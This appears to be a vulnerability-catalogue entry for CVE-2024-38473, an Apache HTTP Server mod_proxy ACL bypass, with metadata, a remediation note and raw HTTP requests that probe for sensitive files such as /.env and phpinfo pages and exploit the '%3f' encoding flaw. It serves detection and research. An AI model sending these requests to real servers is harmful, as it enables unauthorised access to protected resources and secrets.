---
layout: post
cve_id: CVE-2024-38473
title: Apache HTTP Server - ACL Bypass
pcap: true
pcap_path: /pcaps/2024/CVE-2024-38473.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-38473.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: high
impact: 'Authenticated attackers can bypass ACL restrictions by crafting requests
  with incorrect encoding, potentially accessing protected backend services or resources
  that should be restricted by authentication mechanisms.

  '
remediation: 'Upgrade to Apache HTTP Server version 2.4.60 or later.

  '
reference:
- https://blog.orange.tw/2024/08/confusion-attacks-en.html#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass
- https://www.cvedetails.com/cve/CVE-2024-38473/
- https://nvd.nist.gov/vuln/detail/CVE-2024-38473
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://security.netapp.com/advisory/ntap-20240712-0001/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
  cvss-score: 8.1
  cve-id: CVE-2024-38473
  cwe-id: CWE-116
  epss-score: 0.88261
  epss-percentile: 0.99465
  cpe: cpe:/a:apache:http_server, cpe:/a:apache:httpd
metadata:
  max-request: 10
  vendor: Apache Software Foundation
  product: Apache HTTP Server
  google-query: intitle:"Apache HTTP Server" inurl:"/server-status"
tags:
- cve
- cve2024
- apache
- acl-bypass
- mod_proxy
- php-fpm
- vuln
---

## üîç Vulnerability Description
Encoding problem in mod_proxy in Apache HTTP Server 2.4.59 and earlier allows request URLs with incorrect encoding to be sent to backend services, potentially bypassing authentication via crafted requests.


## üåê HTTP Request
```nohighlight
GET /info.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /php-info.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /xmlrpc.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /admin.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /.env HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /phpinfo.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/117.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /admin.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /cpanel.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /bin/cron.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /cache/index.tpl.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /php_info.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/617.29 (KHTML, like Gecko) Version/17.7 Safari/617.29
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /xmlrpc.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/537.86.4
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /sL4MXX%3ftest.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /html/usr/share/doc/hostname/copyright%3f HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

